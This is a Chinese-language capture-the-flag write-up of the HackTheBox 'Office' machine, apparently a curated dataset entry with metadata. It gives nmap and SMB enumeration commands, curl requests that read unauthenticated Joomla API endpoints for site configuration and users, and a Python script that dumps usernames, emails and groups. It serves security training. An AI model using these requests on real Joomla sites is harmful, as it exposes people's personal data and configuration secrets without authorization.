---
title: HTB Office实战式打靶过程
contest: HackTheBox Office
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [htb, pentest, nmap, smb, joomla, api, users, config, colorama]
attack_chain:
  - sudo nmap -sC -sT -sV -O -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389
  - echo '10.10.11.3 dc.office.htb office.htb' >> /etc/hosts
  - smbclient -L //10.10.11.3/
  - curl -v http://10.10.11.3/api/index.php/v1/config/application?public=true
  - curl -v http://10.10.11.3/api/index.php/v1/users?public=true
  - Python 脚本: requests + colorama 解析用户信息
  - fetch_users(base_url) + parse_users() + display_users()
key_payload: curl -v /api/index.php/v1/users?public=true
one_liner: HTB Office打靶：Joomla API未授权用户枚举
lesson: Joomla /api/index.php/v1/users?public=true可枚举所有用户
quality: medium
---

# HTB Office实战式打靶过程

## 题目信息
- 平台：HackTheBox
- 题目：Office
- 类别：Pentest 实战

## 关键攻击链
### 1. 端口扫描
```bash
sudo nmap --min-rate 10000 -p- 10.10.11.3 | grep open | awk -F/ '{print $1}' | paste -sd ','
sudo nmap -sC -sT -sV -O -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389 10.10.11.3
```

### 2. 主机名
```bash
sudo bash -c "echo '10.10.11.3 dc.office.htb office.htb' >> /etc/hosts"
```

### 3. SMB 枚举
```bash
smbclient -L //10.10.11.3/
```

### 4. Joomla API 未授权
```bash
curl -v http://10.10.11.3/api/index.php/v1/config/application?public=true
curl -v http://10.10.11.3/api/index.php/v1/users?public=true
```

### 5. Python 用户枚举脚本
```python
import requests
import json
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

def fetch_users(base_url):
    users_api = f"{base_url}/api/index.php/v1/users?public=true"
    response = requests.get(users_api)
    return response.json()

def parse_users(base_url):
    data = fetch_users(base_url)['data']
    users = []
    for user in data:
        if user['type'] == 'users':
            user_data = user['attributes']
            users.append({
                'id': user_data['id'],
                'name': user_data['name'],
                'username': user_data['username'],
                'email': user_data['email'],
                'groups': user_data['group_names']
            })
    return users

def display_users(base_url):
    users = parse_users(base_url)
    print(Fore.RED + Style.BRIGHT + "User_info")
    for user in users:
        print(f"id:{user['id']}\nname:{user['name']}\nusername:{user['username']}\nemail:{user['email']}\ngroups:{user['groups']}")
```

## 评分
- quality: medium（HTB 实战 + Joomla API 未授权用户枚举）
